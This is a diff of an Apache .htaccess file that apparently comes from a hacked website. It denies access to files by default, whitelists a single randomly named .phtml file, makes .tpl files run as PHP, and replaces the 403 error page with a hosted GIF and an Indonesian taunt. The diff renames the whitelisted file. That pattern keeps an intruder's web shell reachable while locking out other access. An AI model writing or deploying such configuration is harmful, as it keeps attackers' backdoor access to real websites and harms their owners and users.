@@ -5,7 +5,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(689c179100c26.PHtmL)$">
+<FilesMatch "^(689c2f1087ab6.phtml)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
@@ -28,7 +28,7 @@ RewriteCond %{REQUEST_FILENAME} !-d
 RewriteRule . index.php [L]
 </IfModule>
 
-ErrorDocument 403 '<center><img src="https://i.gyazo.com/fe349ca4a75d1a5d5d6df07287019bec.gif"><h3>FORBIDDEN 403</br><center>'
+ErrorDocument 403 "<center><img src='https://i.gyazo.com/fe349ca4a75d1a5d5d6df07287019bec.gif'><h3>FORBIDDEN 403</h3><p>Lewat aja bang domain kecil kok hehe.</p></center>"
 ErrorDocument 404 '<center><img src="https://i.gyazo.com/fe349ca4a75d1a5d5d6df07287019bec.gif"><h3>NOT FOUND 404</br><center>'
 
 AddType application/x-httpd-php .tpl
